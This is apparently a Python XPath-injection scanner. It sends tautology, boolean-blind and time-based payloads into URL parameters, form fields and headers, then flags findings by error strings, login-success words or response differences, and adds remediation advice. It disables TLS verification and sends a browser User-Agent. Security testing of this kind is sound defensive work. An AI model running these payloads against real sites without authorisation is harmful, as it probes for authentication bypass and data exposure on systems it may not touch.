
import hashlib
import logging
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logger = logging.getLogger(__name__)


ERROR_PAYLOADS = [
    "' or '1'='1",
    '" or "1"="1',
    "'] or '1'='1",
    '"] or "1"="1',
    "' or true() or 'x'='y",
    "'] | //node()[' 1 '='1",
    "*:* or '1'='1",
    "' or '1'='1' --",
    "' or '1'='1'/*",
    "1 or 1=1",
    "0 or 1=1",
    "* or '1'='1",
    "@* or '1'='1",
    "<![CDATA[' or '1'='1]]>",
    "' or count(parent::*)>0 or '",
    "' or count(//*)>0 or '",
    "' or string-length(name(//))>0 or '",
    "x') or name()='username' or ('x'='y",
    "' or 'x'='x",
    '" or "x"="x',
    "') or ('x'='x",
    '") or ("x"="x',
]

BLIND_PAIRS = [
    ("' or '1'='1", "' or '1'='2"),
    ('" or "1"="1', '" or "1"="2'),
    ("') or ('1'='1", "') or ('1'='2"),
    ('") or ("1"="1', '") or ("1"="2'),
    ("1 or 1=1", "1 or 1=2"),
    ("' or true() or 'x'='y", "' or false() or 'x'='y"),
    ("' or count(//*)>0 or '1'='2", "' or count(//*)=0 or '1'='2"),
    ("' or string-length(name(//))>0 or '1'='2", "' or string-length(name(//))=0 or '1'='2"),
]

TIME_PAYLOADS = [
    "' or (substring(//user[1]/password,1,1)='a' and doc('http://localhost/?x=1')) or '",
    "' or doc('http://127.0.0.1:1') or '",
]

ERROR_INDICATORS = [
    "xpath", "xslt", "system.xml", "evaluation failed", "expression evaluation",
    "node set", "invalid expression", "syntax error", "unbalanced",
    "literal is expected", "unexpected token", "org.jaxen", "msxml",
    "libxml", "saxparseexception", "xpathexception", "javax.xml",
    "net.sf.saxon", "unterminated string", "invalid token", "xmldocument",
    "xmlreader", "xpathnavigator", "nodelist", "xpathresult",
    "compiledxpathexpression", "xpathexpression", "xmlexception",
]

SUCCESS_INDICATORS = [
    "welcome", "authenticated", "login successful", "admin panel",
    "user found", "account details", "dashboard", "logged in",
    "access granted", "you are now logged in",
]

COMMON_PARAMS = [
    "q", "s", "search", "query", "id", "user", "username", "name",
    "email", "login", "password", "pass", "account", "role", "filter",
    "category", "type", "xml", "xpath", "node", "item", "key", "value",
    "data", "input", "field", "param", "token", "auth",
]

INJECTABLE_HEADERS = ["X-Forwarded-For", "Referer", "User-Agent", "X-Custom-IP-Authorization"]

_TAUTOLOGY_MARKERS = ("or '1'='1", 'or "1"="1', "or true()", "or 1=1", "or 'x'='x", 'or "x"="x')


class XPathInjectionScanner:

    def __init__(self, timeout: int = 8, max_workers: int = 12, test_headers: bool = True):
        self.timeout = timeout
        self.max_workers = max_workers
        self.test_headers = test_headers
        self._lock = threading.Lock()
        self._request_count = 0
        self._session = self._build_session()
        self._abort_scan = False

    def _build_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = False
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=self.max_workers,
            pool_maxsize=self.max_workers * 2,
            max_retries=0,
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        session.headers.update({
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/124.0.0.0 Safari/537.36"
            ),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })
        return session

    def scan(self, data: dict) -> dict:
        target = data.get("target", {})
        injectable_params = set(data.get("injectable_parameters", []))
        base_url = target.get("url", "")
        forms = target.get("forms", [])
        all_internal_links = target.get("all_internal_links", [])
        graph = target.get("graph", {"nodes": []})

        logger.info("=" * 65)
        logger.info("XPATH INJECTION SCANNER - STARTING")
        logger.info(f"  Base URL  : {base_url}")
        logger.info(f"  Forms     : {len(forms)}")
        logger.info(f"  Int. Links: {len(all_internal_links)}")
        logger.info("=" * 65)

        self._abort_scan = False

        tasks = self._build_tasks(base_url, forms, all_internal_links, graph, injectable_params)
        logger.info(f"  Total tasks: {len(tasks)}")

        results = []
        confirmed_endpoints: set[str] = set()

        with ThreadPoolExecutor(max_workers=self.max_workers) as pool:
            futures = {pool.submit(self._test_task, task): task for task in tasks}
            for fut in as_completed(futures):
                if self._abort_scan:
                    break
                try:
                    finding = fut.result()
                    if not finding:
                        continue
                    dedup_key = (finding["endpoint"], finding["parameter"], finding["category"])
                    with self._lock:
                        if dedup_key in confirmed_endpoints:
                            continue
                        confirmed_endpoints.add(dedup_key)
                        results.append(finding)
                        if len(results) >= 3:
                            self._abort_scan = True
                            break
                except Exception as exc:
                    logger.debug(f"Worker error: {exc}")

        results.sort(key=lambda r: {"Critical": 0, "High": 1, "Medium": 2, "Low": 3}.get(r["severity"], 4))

        logger.info(f"XPATH INJECTION SCANNER COMPLETE - {len(results)} findings, {self._request_count} requests")
        return {
            "success": True,
            "engine": "xpath_injection_scanner",
            "results": results,
            "total_requests": self._request_count,
        }

    def _build_tasks(self, base_url, forms, all_links, graph, injectable_params) -> list[dict]:
        tasks: list[dict] = []
        seen: set[tuple] = set()

        def add(kind, url, param="", method="get", data=None, header=""):
            if not url:
                return
            key = (kind, url, param, method, header)
            if key in seen:
                return
            seen.add(key)
            tasks.append({
                "kind": kind,
                "url": url,
                "param": param,
                "method": method.lower(),
                "data": data or {},
                "header": header,
            })

        candidate_urls: set[str] = set()
        if base_url:
            candidate_urls.add(base_url)
        for link in all_links:
            if isinstance(link, str) and link:
                candidate_urls.add(link)
        for node in graph.get("nodes", []):
            node_id = node.get("id", "") if isinstance(node, dict) else str(node)
            if node_id:
                candidate_urls.add(node_id)

        for candidate in candidate_urls:
            parsed = urlparse(candidate)
            qs = parse_qs(parsed.query)
            if not qs:
                continue
            base = urlunparse(parsed._replace(query="", fragment=""))
            for param in qs:
                add("param", base, param, "get")

        for form in forms:
            action = urljoin(base_url, form.get("action") or base_url)
            method = (form.get("method") or "get").lower()
            form_data: dict[str, str] = {}
            for field in form.get("fields", []):
                name = (field.get("name") or "").strip()
                if not name:
                    continue
                if (field.get("type") or "").lower() in ("submit", "button", "image", "reset"):
                    continue
                form_data[name] = field.get("value") or "test"
            for name in form_data:
                add("param", action, name, method, dict(form_data))

        if base_url:
            for param in injectable_params | set(COMMON_PARAMS):
                add("param", base_url, param, "get")
            if self.test_headers:
                for header in INJECTABLE_HEADERS:
                    add("header", base_url, header=header)

        return tasks

    def _test_task(self, task: dict) -> dict | None:
        if self._abort_scan:
            return None
        baseline_resp = self._send(task)
        self._inc()
        if baseline_resp is None:
            return None
        baseline = self._fingerprint(baseline_resp)

        for payload in ERROR_PAYLOADS:
            if self._abort_scan:
                return None
            resp, test_url = self._send_with_payload(task, payload)
            self._inc()
            if resp is None:
                continue
            finding = self._analyse_error_and_logic(resp, payload, baseline, task, test_url)
            if finding:
                return finding

        for true_pl, false_pl in BLIND_PAIRS:
            if self._abort_scan:
                return None
            true_resp, true_url = self._send_with_payload(task, true_pl)
            false_resp, _ = self._send_with_payload(task, false_pl)
            self._inc(2)
            if true_resp is None or false_resp is None:
                continue
            true_fp = self._fingerprint(true_resp)
            false_fp = self._fingerprint(false_resp)
            if self._responses_differ(true_fp, false_fp) and not self._responses_differ(true_fp, baseline):
                return self._make_finding(
                    task=task,
                    category="Blind Differential",
                    severity="High",
                    payload=f"TRUE: {true_pl} / FALSE: {false_pl}",
                    url=true_url,
                    status_code=true_resp.status_code,
                    evidence=(
                        f"TRUE/FALSE payloads produce distinct responses "
                        f"(status {true_fp['status']} vs {false_fp['status']}, "
                        f"length {true_fp['length']} vs {false_fp['length']}) "
                        f"while TRUE matches baseline, confirming boolean-based injection."
                    ),
                )

        for payload in TIME_PAYLOADS:
            if self._abort_scan:
                return None
            finding = self._test_time_based(task, payload, baseline)
            if finding:
                return finding

        return None

    def _analyse_error_and_logic(self, resp, payload, baseline, task, test_url) -> dict | None:
        text = resp.text.lower()
        fp = self._fingerprint(resp)

        for indicator in ERROR_INDICATORS:
            if indicator in text:
                return self._make_finding(
                    task=task,
                    category="Error-Based",
                    severity="Critical",
                    payload=payload,
                    url=test_url,
                    status_code=resp.status_code,
                    evidence=f"XPath engine string '{indicator}' leaked in response body.",
                )

        if self._is_tautology(payload):
            for indicator in SUCCESS_INDICATORS:
                if indicator in text:
                    return self._make_finding(
                        task=task,
                        category="Logic Bypass",
                        severity="Critical",
                        payload=payload,
                        url=test_url,
                        status_code=resp.status_code,
                        evidence=f"Success indicator '{indicator}' present after tautology payload.",
                    )

        if baseline["length"] > 50 and self._responses_differ(fp, baseline):
            return self._make_finding(
                task=task,
                category="Response Deviation",
                severity="Medium",
                payload=payload,
                url=test_url,
                status_code=resp.status_code,
                evidence=(
                    f"Response deviates from baseline: "
                    f"status {baseline['status']}→{fp['status']}, "
                    f"length {baseline['length']}→{fp['length']}."
                ),
            )

        return None

    def _test_time_based(self, task: dict, payload: str, baseline: dict) -> dict | None:
        t0 = time.monotonic()
        resp, test_url = self._send_with_payload(task, payload)
        elapsed = time.monotonic() - t0
        self._inc()
        if resp is None:
            return None
        threshold = max(self.timeout * 0.6, baseline.get("response_time", 0) * 3, 3.0)
        if elapsed >= threshold:
            return self._make_finding(
                task=task,
                category="Time-Based Blind",
                severity="High",
                payload=payload,
                url=test_url,
                status_code=resp.status_code,
                evidence=f"Response delayed {elapsed:.2f}s (threshold {threshold:.2f}s), suggesting out-of-band interaction.",
            )
        return None

    def _send(self, task: dict) -> requests.Response | None:
        try:
            if task["method"] == "post":
                return self._session.post(task["url"], data=task.get("data", {}), timeout=self.timeout, allow_redirects=True)
            return self._session.get(task["url"], timeout=self.timeout, allow_redirects=True)
        except requests.exceptions.RequestException:
            return None

    def _send_with_payload(self, task: dict, payload: str) -> tuple[requests.Response | None, str]:
        try:
            if task["kind"] == "header":
                resp = self._session.get(
                    task["url"],
                    headers={task["header"]: payload},
                    timeout=self.timeout,
                    allow_redirects=True,
                )
                return resp, task["url"]

            if task["method"] == "post":
                data = dict(task.get("data", {}))
                data[task["param"]] = payload
                resp = self._session.post(task["url"], data=data, timeout=self.timeout, allow_redirects=True)
                return resp, task["url"]

            parsed = urlparse(task["url"])
            qs = parse_qs(parsed.query)
            qs[task["param"]] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            resp = self._session.get(test_url, timeout=self.timeout, allow_redirects=True)
            return resp, test_url
        except requests.exceptions.RequestException:
            return None, task["url"]

    def _make_finding(self, *, task, category, severity, payload, url, status_code, evidence) -> dict:
        point = "HEADER" if task["kind"] == "header" else task["method"].upper()
        param = task["header"] if task["kind"] == "header" else task["param"]
        return {
            "vulnerable": True,
            "type": "XPath Injection",
            "category": category,
            "severity": severity,
            "parameter": param,
            "injection_point": point,
            "payload": payload,
            "endpoint": task["url"],
            "test_url": url,
            "status_code": status_code,
            "evidence": evidence,
            "description": f"{category} via {point} parameter '{param}' using XPath payload: {payload}",
            "cwe": "CWE-643",
            "owasp": "A03:2021 - Injection",
            "recommendation": (
                "Never concatenate untrusted input into XPath expressions. "
                "Use parameterised/variable-binding XPath APIs, validate input with strict allowlists, "
                "and return generic error messages rather than XML/XPath engine output."
            ),
        }

    @staticmethod
    def _fingerprint(resp: requests.Response) -> dict:
        body = resp.text if resp else ""
        return {
            "status": resp.status_code if resp else 0,
            "length": len(body),
            "digest": hashlib.md5(body.encode("utf-8", errors="replace")).hexdigest(),
        }

    @staticmethod
    def _responses_differ(a: dict, b: dict) -> bool:
        if a["status"] != b["status"]:
            return True
        if a["digest"] == b["digest"]:
            return False
        larger = max(a["length"], b["length"], 1)
        return abs(a["length"] - b["length"]) / larger > 0.12

    @staticmethod
    def _is_tautology(payload: str) -> bool:
        lower = payload.lower()
        return any(marker in lower for marker in _TAUTOLOGY_MARKERS)

    def _inc(self, n: int = 1) -> None:
        with self._lock:
            self._request_count += n
